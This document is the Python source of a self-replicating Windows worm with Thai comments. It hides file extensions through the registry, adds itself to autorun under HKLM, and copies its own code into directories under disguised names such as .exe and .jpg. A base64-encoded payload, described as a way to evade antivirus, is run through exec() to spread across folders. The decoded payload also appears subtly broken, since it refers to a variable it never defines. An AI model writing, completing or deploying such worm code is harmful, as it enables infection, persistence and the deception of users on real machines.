import os
import sys
import random
import winreg
import base64
import argparse

def get_own_source_code():
    """
    ฟังก์ชันนี้ทำหน้าที่อ่านตัวเอง (Self-Replication Core)
    มันจะเปิดไฟล์ที่กำลังรันอยู่และอ่านทุก byte ออกมาเก็บไว้ในตัวแปร
    """
    # __file__ เป็นตัวแปรพิเศษที่เก็บ path ของสคริปต์นี้อยู่
    try:
        with open(__file__, 'r') as f:
            return f.read()
    except Exception as e:
        return None

def hide_file_extensions():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "HideFileExt", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("[+] File extensions hidden")
    except Exception as e:
        print(f"[-] Failed to hide file extensions: {e}")

def add_to_autorun():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SelfReplicatingWorm", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(key)
        print("[+] Added to autorun")
    except Exception as e:
        print(f"[-] Failed to add to autorun: {e}")

def replicate_to_directory(target_dir, source_code):
    """
    ฟังก์ชันนี้เป็น Propagation Engine
    จะวนลูปสร้างไฟล์สำเนาของตัวเองใน Directory ที่กำหนด
    """
    if not source_code:
        return

    # สร้างชื่อไฟล์สุ่มเพื่อหลบหลีกการจับกุมง่ายๆ (Basic Obfuscation)
    extensions = ['.py', '.exe', '.jpg']
    random_ext = random.choice(extensions)
    random_name = "important_file_" + str(random.randint(1000, 9999)) + random_ext
    target_path = os.path.join(target_dir, random_name)

    # เขียนโค้ดตัวเองลงไปในไฟล์ใหม่ (Infection)
    try:
        with open(target_path, 'w') as f:
            f.write(source_code)
        print(f"[+] Replicated to: {target_path}")
    except Exception as e:
        print(f"[-] Failed to replicate: {e}")

# Encrypted Payload for Antivirus Evasion
encrypted_payload = "CgptX2NvZGUgPSBnZXRfb3duX3NvdXJjZV9jb2RlKCkKY3VycmVudF9kaXIgPSBvcy5nZXRjd2QoKQpwcmludChmIltqXSBBZHZhbmNlZCBXb3JtIHN0YXJ0ZWQgYXQ6IHtjdXJyZW50X2Rpcn0iKQpmb3Igcm9vdCwgbGlyc3MsIGZpbGVzIGluIG9zLndhbGsoY3VycmVudF9kaXIpOgoJZm9yIGRpcmVjdG9yeSBpbiBkaXJzOgoJCWlmIGRpcmVjdG9yeSBub3QgaW4gWyJfX3B5Y2FjaGVfXyIsICJTeXN0ZW0iLCAiV2luZG93cyJdOgoJCQkjIHNjYW5fYW5kX3NwcmVhZCgpCgkJCXRhcmdldF9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGRpcmVjdG9yeSkKCQkJcmVwbGljYXRlX3RvX2RpcmVjdG9yeSh0YXJnZXRfcGF0aCwgbXlfY29kZSkK"

# --- Main Execution ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Self-Replicating Worm")
    parser.add_argument('--scan', action='store_true', help='Scan and spread the worm')
    parser.add_argument('--hide', action='store_true', help='Hide file extensions')
    parser.add_argument('--autorun', action='store_true', help='Add to autorun')
    args = parser.parse_args()
    # If no arguments, run all
    run_all = not any([args.scan, args.hide, args.autorun])
    
    if args.hide or run_all:
        hide_file_extensions()
    if args.autorun or run_all:
        add_to_autorun()
    if args.scan or run_all:
        exec(base64.b64decode(encrypted_payload))